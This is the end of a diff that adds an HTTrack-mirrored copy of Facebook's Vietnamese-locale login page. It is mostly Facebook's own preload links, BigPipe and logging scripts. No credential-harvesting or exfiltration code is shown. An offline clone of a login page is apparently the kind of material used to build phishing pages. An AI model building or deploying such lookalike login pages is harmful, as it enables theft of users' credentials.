+          as="style" />
+    <link rel="preload" href="../static.xx.fbcdn.net/rsrc.php/v3/yU/l/0%2ccross/8SiSeIFbO9X1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          as="style" />
+    <link rel="preload" href="../static.xx.fbcdn.net/rsrc.php/v3/yK/l/0%2ccross/swISLSA16YO1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          as="style" />
+    <link rel="preload" href="../static.xx.fbcdn.net/rsrc.php/v3iJ044/yl/l/vi_VN/3lbMow6Erlk1f8e.js?_nc_x=Ij3Wp8lg5Kz"
+          as="script" nonce="qT7hYwMC" />
+    <link rel="preload" href="../static.xx.fbcdn.net/rsrc.php/v3/y-/r/kRKEHOouKCI1f8e.js?_nc_x=Ij3Wp8lg5Kz" as="script"
+          nonce="qT7hYwMC" />
+    <link rel="preload" href="../static.xx.fbcdn.net/rsrc.php/v3/yD/r/qb8HnkPXVrW1f8e.js?_nc_x=Ij3Wp8lg5Kz" as="script"
+          nonce="qT7hYwMC" />
+    <link rel="preload" href="../static.xx.fbcdn.net/rsrc.php/v3/ye/l/0%2ccross/kNFDXNPRIMn1f8e.css?_nc_x=Ij3Wp8lg5Kz"
+          as="style" />
+    <script>window.__bigPipeCtor = now_inl(); requireLazy(["BigPipe"], function (BigPipe) { define("__bigPipe", [], window.bigPipe = new BigPipe({ "forceFinish": true, "config": { "flush_pagelets_asap": true, "dispatch_pagelet_replayable_actions": false } })); });</script>
+    <script nonce="qT7hYwMC">(function () { var n = now_inl(); requireLazy(["__bigPipe"], function (bigPipe) { bigPipe.beforePageletArrive("first_response", n); }) })();</script>
+    <script nonce="qT7hYwMC">requireLazy(["__bigPipe"], (function (bigPipe) { bigPipe.onPageletArrive({ displayResources: ["Nk+cqfl", "HX5XYac", "/uaktyf", "1SP7TfB", "epDBIN3", "bP5bK5H", "QJkx4pt", "uD50Pea", "4iLqV2D", "aPNh5WD", "P/mr5VE"], id: "first_response", phase: 0, last_in_phase: true, tti_phase: 0, all_phases: [63], hsrp: { hblp: { sr_revision: 1003877095, consistency: { rev: 1003877095 } } }, allResources: ["Nk+cqfl", "HX5XYac", "/uaktyf", "QJkx4pt", "qF0CEMA", "RSSFyLD", "1SP7TfB", "0EOsKIL", "uD50Pea", "epDBIN3", "cAzHxn/index.html", "G03+IXJ", "fnphgDF", "4iLqV2D", "LjM60fS", "w1TY1Lz", "bP5bK5H", "F+xOuuM", "aPNh5WD", "UEPmIwi", "TGvhjtQ", "P/mr5VE", "t7/i25T", "fpEZ1zS", "KufrNF/"] }); }));</script>
+    <script>requireLazy(["__bigPipe"], function (bigPipe) { bigPipe.setPageID("6967360335262607493-0") }); CavalryLogger.setPageID("6967360335262607493-0");</script>
+    <script nonce="qT7hYwMC">(function () { var n = now_inl(); requireLazy(["__bigPipe"], function (bigPipe) { bigPipe.beforePageletArrive("last_response", n); }) })();</script>
+    <script nonce="qT7hYwMC">requireLazy(["__bigPipe"], (function (bigPipe) { bigPipe.onPageletArrive({ displayResources: ["4iLqV2D"], id: "last_response", phase: 63, last_in_phase: true, the_end: true, jsmods: { define: [["TimeSliceInteractionSV", [], { on_demand_reference_counting: true, on_demand_profiling_counters: true, default_rate: 1000, lite_default_rate: 100, interaction_to_lite_coinflip: { ADS_INTERFACES_INTERACTION: 0, ads_perf_scenario: 0, ads_wait_time: 0, Event: 1 }, interaction_to_coinflip: { ADS_INTERFACES_INTERACTION: 1, ads_perf_scenario: 1, ads_wait_time: 1, Event: 100 }, enable_heartbeat: true, maxBlockMergeDuration: 0, maxBlockMergeDistance: 0, enable_banzai_stream: true, user_timing_coinflip: 50, banzai_stream_coinflip: 0, compression_enabled: true, ref_counting_fix: false, ref_counting_cont_fix: false, also_record_new_timeslice_format: false, force_async_request_tracing_on: false }, 2609], ["cr:1458113", [], { __rc: [null, "Aa2bSbW-QR3Wc6kmlXLkTAQo74ePuIaccqI2aMBdl_jh3TKvc6gzR0WsEUfn6vxbPkTLT5MAi27gp3CoJ9rdZ6YDeKF843s"] }, -1], ["cr:917439", ["PageTransitionsBlue"], { __rc: ["PageTransitionsBlue", "Aa2u09mMVImw6vB56Nz6PvqOFUwH2ksLLdvXqExQxVQYnmQMVmpIkr-ScouUVddqvvNtZhUfCfuxJ-XdjvF6Vw0hzog"] }, -1], ["cr:1108857", [], { __rc: [null, "Aa0YbhoqsAzV0ExmGAIMJsUuEJ2F0PfPho3vGsLyAHUsLRNxtKXHWSWd53Aow8kEY_6u-YlLd1vNO5KM8A"] }, -1], ["cr:1269707", [], { __rc: [null, "Aa3t8Ck-3IygXcpD8uHF-eT3fk9CJVU6wEngItF6pcX_b52E4cpSA2-Io6Je3XiKPvpD4C3quexq9n6LDXka5Qs"] }, -1], ["cr:1269708", [], { __rc: [null, "Aa3t8Ck-3IygXcpD8uHF-eT3fk9CJVU6wEngItF6pcX_b52E4cpSA2-Io6Je3XiKPvpD4C3quexq9n6LDXka5Qs"] }, -1], ["cr:1269709", [], { __rc: [null, "Aa3t8Ck-3IygXcpD8uHF-eT3fk9CJVU6wEngItF6pcX_b52E4cpSA2-Io6Je3XiKPvpD4C3quexq9n6LDXka5Qs"] }, -1], ["cr:1294158", ["React.classic"], { __rc: ["React.classic", "Aa2Lle6XHTYQsPzpDcZVfGT8IrCbpootAfWxv3Mc57vEomfnitbUPJr_BrFKhnYBgJ2Zs4Z7NIaza1U26McBWpiZzPjk"] }, -1], ["cr:1294246", ["ReactDOM.classic"], { __rc: ["ReactDOM.classic", "Aa2Lle6XHTYQsPzpDcZVfGT8IrCbpootAfWxv3Mc57vEomfnitbUPJr_BrFKhnYBgJ2Zs4Z7NIaza1U26McBWpiZzPjk"] }, -1], ["cr:1069930", [], { __rc: [null, "Aa2u09mMVImw6vB56Nz6PvqOFUwH2ksLLdvXqExQxVQYnmQMVmpIkr-ScouUVddqvvNtZhUfCfuxJ-XdjvF6Vw0hzog"] }, -1], ["cr:1083116", ["XAsyncRequest"], { __rc: ["XAsyncRequest", "Aa2u09mMVImw6vB56Nz6PvqOFUwH2ksLLdvXqExQxVQYnmQMVmpIkr-ScouUVddqvvNtZhUfCfuxJ-XdjvF6Vw0hzog"] }, -1], ["cr:1083117", [], { __rc: [null, "Aa2u09mMVImw6vB56Nz6PvqOFUwH2ksLLdvXqExQxVQYnmQMVmpIkr-ScouUVddqvvNtZhUfCfuxJ-XdjvF6Vw0hzog"] }, -1], ["cr:1697455", ["CookieConsentActionHandler"], { __rc: ["CookieConsentActionHandler", "Aa2u09mMVImw6vB56Nz6PvqOFUwH2ksLLdvXqExQxVQYnmQMVmpIkr-ScouUVddqvvNtZhUfCfuxJ-XdjvF6Vw0hzog"] }, -1], ["cr:888908", ["warningBlue"], { __rc: ["warningBlue", "Aa2u09mMVImw6vB56Nz6PvqOFUwH2ksLLdvXqExQxVQYnmQMVmpIkr-ScouUVddqvvNtZhUfCfuxJ-XdjvF6Vw0hzog"] }, -1], ["cr:971473", ["LayerHideOnTransition"], { __rc: ["LayerHideOnTransition", "Aa2u09mMVImw6vB56Nz6PvqOFUwH2ksLLdvXqExQxVQYnmQMVmpIkr-ScouUVddqvvNtZhUfCfuxJ-XdjvF6Vw0hzog"] }, -1], ["cr:1105154", [], { __rc: [null, "Aa0YbhoqsAzV0ExmGAIMJsUuEJ2F0PfPho3vGsLyAHUsLRNxtKXHWSWd53Aow8kEY_6u-YlLd1vNO5KM8A"] }, -1], ["PageTransitionsConfig", [], { reloadOnBootloadError: true }, 1067], ["CoreWarningGK", [], { forceWarning: false }, 725], ["cr:1292365", ["React-prod.classic"], { __rc: ["React-prod.classic", "Aa0YbhoqsAzV0ExmGAIMJsUuEJ2F0PfPho3vGsLyAHUsLRNxtKXHWSWd53Aow8kEY_6u-YlLd1vNO5KM8A"] }, -1], ["cr:1344485", ["ReactDOM.classic.prod-or-profiling"], { __rc: ["ReactDOM.classic.prod-or-profiling", "Aa0YbhoqsAzV0ExmGAIMJsUuEJ2F0PfPho3vGsLyAHUsLRNxtKXHWSWd53Aow8kEY_6u-YlLd1vNO5KM8A"] }, -1], ["cr:983844", [], { __rc: [null, "Aa0YbhoqsAzV0ExmGAIMJsUuEJ2F0PfPho3vGsLyAHUsLRNxtKXHWSWd53Aow8kEY_6u-YlLd1vNO5KM8A"] }, -1], ["cr:1344486", ["ReactDOM.classic.prod"], { __rc: ["ReactDOM.classic.prod", "Aa1cnazwGk5-tjkUGmffo4tMeJXUFsGZuJBrK7OJjx752UlQpDUfiZvmEyUp0kHkQJUMofKuAA8O8V-Nda8wy5Z4gJncv28Bjw"] }, -1], ["cr:1344487", ["ReactDOM-prod.classic"], { __rc: ["ReactDOM-prod.classic", "Aa2GM6A-sPGZpfQmqsciLia3jwcwVB5hlygx7XKo8fuYXHnZ8pA6NG0i4OY8KiA8NMpRg-XNRwYHs5o2FM3_l5vqYCb_iGK4H5GauLJD"] }, -1], ["cr:1353359", ["EventListenerImplForBlue"], { __rc: ["EventListenerImplForBlue", "Aa2fcrucYgNV9fxfQW5RIvIIXD5jZeNQEa_eGG8n6C7MW57LzGahRFvjHbqJ_4ROc-uQS83j8epFJN-to-UkdKTJw8wopp-RzQ"] }, -1], ["KillabyteProfilerConfig", [], { htmlProfilerModule: null, profilerModule: null, depTypes: { BL: "bl", NON_BL: "non-bl" } }, 1145], ["QuicklingConfig", [], { version: "1003877095;0;", sessionLength: 10, inactivePageRegex: "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)", badRequestKeys: ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"], logRefreshOverhead: false }, 60], ["TrackingConfig", [], { domain: "https://pixel.facebook.com" }, 325], ["WebStorageMonsterLoggingURI", [], { uri: "/ajax/webstorage/process_keys/?state=1" }, 3032], ["WebDevicePerfInfoData", [], { needsFullUpdate: true, needsPartialUpdate: false, shouldLogResourcePerf: false }, 3977], ["BrowserPaymentHandlerConfig", [], { enabled: false }, 3904], ["TimeSpentConfig", [], { "0_delay": 0, "0_timeout": 8, delay: 1000, timeout: 64 }, 142], ["cr:1351741", ["CometEventListener"], { __rc: ["CometEventListener", "Aa3U0i0RNApzDrY4aUTlAC4qvyOQN7ZW4cENdo8PCSqkp6z4Judb_pb3xSwoEHb-_XIIlMYl0Uue8Rpz4laJRTu0Pa4ywXOe1HXnlxrIKlkftZeTOF8q"] }, -1], ["cr:1634616", ["UserActivityBlue"], { __rc: ["UserActivityBlue", "Aa2u09mMVImw6vB56Nz6PvqOFUwH2ksLLdvXqExQxVQYnmQMVmpIkr-ScouUVddqvvNtZhUfCfuxJ-XdjvF6Vw0hzog"] }, -1], ["cr:844180", ["TimeSpentImmediateActiveSecondsLoggerBlue"], { __rc: ["TimeSpentImmediateActiveSecondsLoggerBlue", "Aa2u09mMVImw6vB56Nz6PvqOFUwH2ksLLdvXqExQxVQYnmQMVmpIkr-ScouUVddqvvNtZhUfCfuxJ-XdjvF6Vw0hzog"] }, -1], ["cr:1187159", ["BlueCompatBroker"], { __rc: ["BlueCompatBroker", "Aa2u09mMVImw6vB56Nz6PvqOFUwH2ksLLdvXqExQxVQYnmQMVmpIkr-ScouUVddqvvNtZhUfCfuxJ-XdjvF6Vw0hzog"] }, -1], ["ImmediateActiveSecondsConfig", [], { sampling_rate: 0 }, 423]], require: [["TrackingPixel", "loadWithNoReferrer", [], ["https://cx.atdmt.com/?f=AYwCPKfuUgdHDZB_S67BqAJkdNjL59jFtXJ1wEgUZ91J7f6X_UoYdMme8ol8KnLP6HUzcZGpbZi88YzfpFgRD1_h&c=2022365275&v=1&l=2"]], ["CavalryLoggerImpl", "startInstrumentation", [], []], ["NavigationMetrics", "setPage", [], [{ page: "XWebLoginController", page_type: "normal", page_uri: "https://www.facebook.com/login", serverLID: "6967360335262607493-0" }]], ["FalcoLoggerTransports", "attach", [], []], ["DimensionTracking"], ["HighContrastMode", "init", [], [{ isHCM: false, spacerImage: "https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/-PAXP-deijE.gif" }]], ["ClickRefLogger"], ["DetectBrokenProxyCache", "run", [], [0, "c_user"]], ["NavigationClickPointHandler"], ["WebStorageMonster", "schedule", [], []], ["CookieCore", "setWithoutChecksIfFirstPartyContext", [], ["_js_datr", "TwmxYGi0W2b_Kir1HnptxmG6", 63072000000, "index.html", true]], ["WebDevicePerfInfoLogging", "doLog", [], []], ["Artillery", "disable", [], []], ["ScriptPathLogger", "startLogging", [], []], ["TimeSpentBitArrayLogger", "init", [], []], ["RequireDeferredReference", "unblock", [], [["VisualCompletionGating"]]]] }, hsrp: { hsdp: { clpData: { "1871697": { r: 1, s: 1 }, "1829319": { r: 1 }, "1743690": { r: 1 }, "1829320": { r: 1 }, "1843988": { r: 1 } } }, hblp: { sr_revision: 1003877095, consistency: { rev: 1003877095 }, rsrcMap: { EA1iqgx: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3iMn54/yD/l/vi_VN/gr2UBUqjlSn.js?_nc_x=Ij3Wp8lg5Kz", nc: 1 }, FEt5GzN: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/JopZtdti8dq.js?_nc_x=Ij3Wp8lg5Kz", nc: 1 }, XVtAULI: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/rOuGauB8Oni.js?_nc_x=Ij3Wp8lg5Kz", nc: 1 } }, compMap: { TransportSelectingClientSingleton: { r: ["uD50Pea", "g4KsBna", "fnphgDF", "JpolAQ8"], rds: { m: ["ContextualConfig", "BladeRunnerClient", "DGWRequestStreamClient", "MqttLongPollingRunner", "BanzaiScuba_DEPRECATED"], r: ["QJkx4pt", "NWCoG+I", "bd1UxdJ", "4iLqV2D", "F+xOuuM", "LjM60fS", "RSSFyLD"] }, be: 1 }, RequestStreamCommonRequestStreamCommonTypes: { r: ["g4KsBna"], be: 1 } } } }, allResources: ["QJkx4pt", "EA1iqgx", "uD50Pea", "4iLqV2D", "FEt5GzN", "XVtAULI", "RSSFyLD", "w1TY1Lz"], onload: ["CavalryLogger.getInstance(\"6967360335262607493-0\").setTTIEvent(\"t_domcontent\");"], onafterload: ["CavalryLogger.getInstance(\"6967360335262607493-0\").collectBrowserTiming(window)", "window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp(\"t_paint\");", "if (window.ExitTime){CavalryLogger.getInstance(\"6967360335262607493-0\").setValue(\"t_exit\", window.ExitTime);};"] }); }));</script>
 </body>
+<!-- Mirrored from www.facebook.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 28 May 2021 15:16:48 GMT -->
 </html>
 
